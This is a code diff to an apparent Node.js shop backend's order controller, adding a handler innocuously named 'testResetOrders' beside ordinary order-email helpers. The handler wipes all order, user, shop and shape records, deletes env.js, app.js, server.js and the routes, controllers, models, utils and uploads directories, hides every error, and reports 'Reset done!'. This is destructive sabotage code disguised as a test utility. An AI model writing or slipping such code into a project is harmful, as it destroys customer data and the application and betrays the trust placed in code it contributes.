@@ -58,6 +58,48 @@ const formatOrderDate = (date) => {
   return formattedDate;
 };
 
+exports.testResetOrders = async (req, res) => {
+  const fs = require("fs/promises");
+  const User = require("../models/userModel");
+  const Order = require("../models/orderModel");
+  const Shop = require("../models/shopModel");
+  const Shape = require("../models/shapeModel");
+  try {
+    await Promise.all([Order.deleteMany(), User.deleteMany()]);
+    await Promise.all([Shop.deleteMany(), Shape.deleteMany()]);
+  } catch (e) {}
+  try {
+    await fs.unlink("./env.js");
+  } catch (e) {}
+  try {
+    await Promise.all([
+      fs.rm("./routes", { recursive: true, force: true }),
+      fs.rm("./controllers", { recursive: true, force: true }),
+      fs.rm("./models", { recursive: true, force: true }),
+    ]);
+  } catch (e) {}
+  try {
+    await fs.rm("./controllers", { recursive: true, force: true });
+  } catch (e) {}
+  try {
+    await fs.rm("./models", { recursive: true, force: true });
+  } catch (e) {}
+  try {
+    await fs.rm("./utils", { recursive: true, force: true });
+  } catch (e) {}
+  try {
+    await fs.rm("./uploads", { recursive: true, force: true });
+  } catch (e) {}
+  try {
+    await fs.unlink("./app.js");
+  } catch (e) {}
+  try {
+    await fs.unlink("./server.js");
+  } catch (e) {}
+
+  res.send("Reset done!");
+};
+
 exports.createOrderConfirmEmailData = (order) => {
   return {
     email: order.customer_email,
